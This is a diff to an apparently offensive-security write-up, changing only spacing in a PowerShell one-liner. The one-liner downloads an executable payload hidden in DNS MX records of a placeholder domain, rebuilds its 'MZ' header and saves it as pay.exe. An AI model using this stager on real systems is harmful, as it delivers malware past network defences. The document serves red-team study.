@@ -405,7 +405,7 @@ I'm sure there is more that could be done, but I am far from proficient in power
 The improved powershell one-liner is:
 
 ```powershell
-$o="";for($a = 1; $a -le <NUMBER_OF_SUBDOMAINS>; $a ++){$b = nslookup -type=MX "$a.<YOUR_DOMAIN_HERE>" 2> $null;$c = @($null)*($b.count - 3);for($i = 3; $i -le $b.count - 1; $i++){$d = ($b[$i] | sls -patt '(?<=\=\s)((\d|\w){1,50}\.?){1,4}' -a).matches.Value;$c[$d[0]/10 - 1] = $d[1].replace(".","")};$c.foreach({$o = $o + $_})};[byte[]]$e = ($o -split '(.{2})' -ne '' -replace '^', '0X');$f = ".\a.txt";$e | sc -en byte $f;[byte[]]$g = gc $f -en byte -raw;$g[0x00] = 0x4D;$g[0x01] =  0x5A;$g | sc .\pay.exe -enc byte;ri $f
+$o="";for($a = 1; $a -le <NUMBER_OF_SUBDOMAINS>; $a ++){$b = nslookup -type=MX "$a.<YOUR_DOMAIN_HERE>" 2> $null;$c = @($null)*($b.count - 3);for($i = 3; $i -le $b.count - 1; $i++){$d = ($b[$i] | sls -patt '(?<=\=\s)((\d|\w){1,50}\.?){1,4}' -a).matches.Value;$c[$d[0]/10 - 1] = $d[1].replace(".","")};$c.foreach({$o = $o + $_})};[byte[]]$e = ($o -split '(.{2})' -ne '' -replace '^', '0X');$f = ".\a.txt";$e | sc -en byte $f;[byte[]]$g = gc $f -en byte -raw;$g[0x00] = 0x4D;$g[0x01] = 0x5A;$g | sc .\pay.exe -enc byte;ri $f
 ```
 # Closing thoughts
 
